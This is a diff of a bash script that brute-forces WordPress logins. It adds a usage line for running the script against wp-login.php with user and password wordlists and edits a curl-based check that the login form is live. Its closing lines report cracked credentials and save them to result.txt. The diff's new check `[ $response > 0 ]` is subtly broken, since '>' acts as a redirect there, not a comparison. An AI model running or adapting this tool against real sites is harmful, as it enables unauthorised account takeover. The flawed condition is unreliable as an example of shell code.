@@ -2,18 +2,20 @@
 # Bruteforce single Wordpress
 # Created: 19-06-2021
 # Script Author : Chi Vo
+# Usage: sh wordpress.sh http://localhost/wp-login.php user.txt pass.txt
 
 check_login_form() {
 	TARGET=$1
 	echo "Check site live ..."
 	response=$(curl -kis -X POST "$TARGET" -d "log=&pwd=" | grep "loginform" | wc -l)
-	if [ $response = 1 ]; then
+	if [ $response > 0 ]; then
 		echo "Target Ok"
 	else
 		echo "${RED}Target not work !"
 		exit
 	fi
 }
+
 crack_pass() {
 	TARGET=$1
 	USER=$2
@@ -88,4 +90,3 @@ echo "${GREEN}Cracked Successfully!"
 echo "User: $USERCRACKED"
 echo "Pass: $PASSWORD"
 echo "$TARGET|$USERCRACKED|$PASSWORD" >result.txt
-
